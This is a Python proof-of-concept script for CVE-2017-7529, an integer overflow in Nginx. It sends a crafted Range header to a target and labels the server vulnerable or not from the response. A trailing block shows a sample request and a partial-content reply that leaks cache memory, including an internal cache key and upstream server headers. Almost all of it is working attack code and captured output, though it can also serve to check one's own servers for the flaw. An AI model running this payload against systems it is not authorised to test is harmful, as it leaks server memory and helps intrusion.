#!/usr/bin/python
# -*- coding:utf-8 -*-

# Nginx - Remote Integer Overflow Vulnerability
# CVE-2017-7529

import argparse
import logging
import requests


logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)


def send_http_request(url, headers={}, timeout=8.0):
    http_response = requests.get(url, headers=headers, timeout=timeout)
    http_headers = http_response.headers

    log.info("status: %s" % http_response.status_code)
    log.info("server: %s" % http_headers.get("Server", ""))
    return http_response


def exploit(url):
    log.info("target: %s", url)
    http_response = send_http_request(url)

    content_length = http_response.headers.get("Content-Length", 0)
    bytes_length = int(content_length) + 623
    content_length = "bytes=-%d,-9223372036854%d" % (
        bytes_length, 776000 - bytes_length)

    http_response = send_http_request(url, headers={"Range": content_length})
    if http_response.status_code == 206 and "Content-Range" in http_response.headers:
        log.info("vulnerable: Vulnerable to CVE-2017-7529")
    elif http_response.status_code == 416:
        log.warn("vulnerable: Not Vulnerable (Range Not Satisfiable)")
    else:
        log.info("vulnerable: Unknown (%s)" % http_response.status_code)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Nginx - Remote Integer Overflow Vulnerability - CVE 2017-7529")
    parser.add_argument('url', help="URL to test", type=str)
    args = parser.parse_args()

    exploit(args.url)


"""
GET /proxy/demo.png HTTP/1.1
Accept-Encoding: identity
Range: bytes=-17208,-9223372036854758792
Host: 127.0.0.1:8000
Connection: close
User-Agent: Python-urllib/2.7
HTTP/1.1 206 Partial Content
Server: nginx/1.13.1
Date: Mon, 14 Aug 2017 05:53:54 GMT
Content-Type: multipart/byteranges; boundary=00000000000000000002
Connection: close
Last-Modified: Mon, 17 Jul 2017 02:19:08 GMT
ETag: "40c9-5547a060fdf00"
X-Proxy-Cache: HIT
--00000000000000000002
Content-Type: image/png
Content-Range: bytes -623-16584/16585
.......<.Y......................lY....r:.Y.....@.`..v.q.."40c9-5547a060fdf00".................................................................................................................................................................................................................................................................
KEY: httpGET127.0.0.1/proxy/demo.png
HTTP/1.1 200 OK
Date: Mon, 14 Aug 2017 05:51:46 GMT
Server: Apache/2.4.25 (Debian)
Last-Modified: Mon, 17 Jul 2017 02:19:08 GMT
ETag: "40c9-5547a060fdf00"
Accept-Ranges: bytes
Content-Length: 16585
Connection: close
Content-Type: image/png
"""